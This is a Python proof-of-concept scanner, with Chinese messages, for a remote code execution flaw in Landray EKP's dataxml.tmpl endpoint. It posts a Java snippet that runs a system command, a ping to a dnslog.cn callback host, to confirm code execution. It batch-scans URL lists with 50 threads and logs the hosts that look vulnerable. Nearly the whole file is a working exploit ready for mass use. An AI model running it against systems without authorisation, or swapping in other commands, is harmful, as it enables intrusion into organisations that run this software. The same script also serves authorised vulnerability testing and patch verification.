import argparse,requests,sys,urllib3
from multiprocessing.dummy import Pool
from urllib3.exceptions import InsecureRequestWarning


# 禁用 SSL 警告
urllib3.disable_warnings(InsecureRequestWarning)

def banner():
    print("""蓝凌 EKP /ekp/data/sys-common/dataxml.tmpl RCE漏洞检测""")

def poc(target):
    payload = "/ekp/data/sys-common/dataxml.tmpl"
    data = {
        "s_bean": "ruleFormulaValidate",
        "script": """try {
String cmd = "ping 1q0k6o.dnslog.cn";
Process child = Runtime.getRuntime().exec(cmd);
} catch (IOException e) { System.err.println(e); }"""
    }

    try:
        res1 = requests.get(url=target, timeout=10, verify=False)
        if res1.status_code != 200:
            print(f"[-] {target} 状态码异常: {res1.status_code}")
            return

        res2 = requests.post(url=target+payload, data=data, timeout=10, verify=False)
        if res2.status_code == 200 and "java.lang" not in res2.text:
            print(f"[+] {target} 可能存在 RCE 漏洞")
            with open('result.txt', 'a', encoding='utf-8') as f:
                f.write(target + '\n')
        else:
            print(f"[-] {target} 未发现漏洞")
    except:
        pass

def main():
    banner()
    parse = argparse.ArgumentParser(description="蓝凌 EKP RCE 漏洞检测")
    parse.add_argument('-u', '--url', dest='url', type=str, help="单个目标URL，例如：http://ip:port")
    parse.add_argument('-f', '--file', dest='file', type=str, help="批量URL文件路径")
    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f:
                url = url.strip()
                if url:
                    url_list.append(url)
        mp = Pool(50)  # 可根据网络情况调整线程数
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage: python {sys.argv[0]} -u http://target 或 -f url.txt")

if __name__ == '__main__':
    main()
